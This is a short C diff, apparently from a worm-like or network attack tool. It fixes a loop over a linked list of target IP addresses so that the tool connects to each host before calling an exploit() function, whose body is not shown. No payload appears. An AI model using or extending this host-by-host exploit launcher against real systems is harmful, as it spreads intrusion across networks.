@@ -164,8 +164,13 @@ int main(int argc, char * argv[]) {
 		}
 		else{
 			// Setting up a client connection
-			server_addr.sin_addr.s_addr = current->IP;			// Launch exploit 
-			exploit(connfd);
+			server_addr.sin_addr.s_addr = current->IP;
+			int connfd;
+			connfd = connect(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr));
+			if (connfd >= 0){
+				// Launch exploit
+				exploit(connfd);
+			}
 		}
 		current = current->Suivant;
 	}
